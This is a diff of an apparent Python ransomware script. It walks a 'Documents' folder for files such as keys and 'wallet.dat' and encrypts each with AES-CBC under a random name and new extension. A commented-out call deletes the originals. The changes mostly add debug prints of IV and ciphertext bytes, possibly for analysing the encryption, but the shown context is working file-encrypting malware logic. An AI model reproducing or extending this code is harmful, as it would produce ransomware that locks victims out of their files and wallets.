@@ -296,7 +296,7 @@ def find_files(root_dir):
      '*.csr',
      '*.key',
      'wallet.dat']
-    
+
     for dirpath, dirs, files in os.walk(root_dir):
         if 'Windows' not in dirpath:
             for basename in files:
@@ -304,6 +304,7 @@ def find_files(root_dir):
                     if fnmatch.fnmatch(basename, ext):
                         filename = os.path.join(dirpath, basename)
                         yield filename
+                        
 
 def text_generator(size = 6, chars = string.ascii_uppercase + string.digits):
     return ''.join((random.choice(chars) for _ in range(size))) + '.' + newextns
@@ -331,6 +332,7 @@ def encrypt_file(key, in_filename, newfilename, out_filename = None, chunksize =
     if not out_filename:
         out_filename = newfilename
     iv = ''.join((chr(random.randint(0, 255)) for i in range(16)))
+    print(hex(ord(iv[15])))
     encryptor = AES.new(key, AES.MODE_CBC, iv)
     filesize = os.path.getsize(in_filename)
     with open(in_filename, 'rb') as infile:
@@ -344,7 +346,17 @@ def encrypt_file(key, in_filename, newfilename, out_filename = None, chunksize =
                     break
                 elif len(chunk) % 16 != 0:
                     chunk += ' ' * (16 - len(chunk) % 16)
-                outfile.write(encryptor.encrypt(chunk))
+                print(hex(ord(chunk[0])))
+                x = encryptor.encrypt(chunk)
+                outfile.write(x)
+                if (len(x) >= 65536):
+                    print(hex(ord(x[65535]))+" "+hex(ord(x[65534])))
+                print(hex(ord(x[0]))+" "+hex(ord(x[1]))+" "+hex(ord(x[2])))
+                
+    with open(out_filename, 'rb') as infile:
+        x = infile.read(30)
+        print("bru "+hex(ord(x[24]))+" "+hex(ord(x[25]))+" "+hex(ord(x[26])))
+        
     print(out_filename)
 
 
@@ -352,6 +364,7 @@ listdir = ["Documents"]
 
 for dir_ in listdir:
     for filename in find_files(dir_):
-        generate_file(dir_, filename)
         print(filename)
+        generate_file(dir_, filename)
+
         #delete_file(filename)
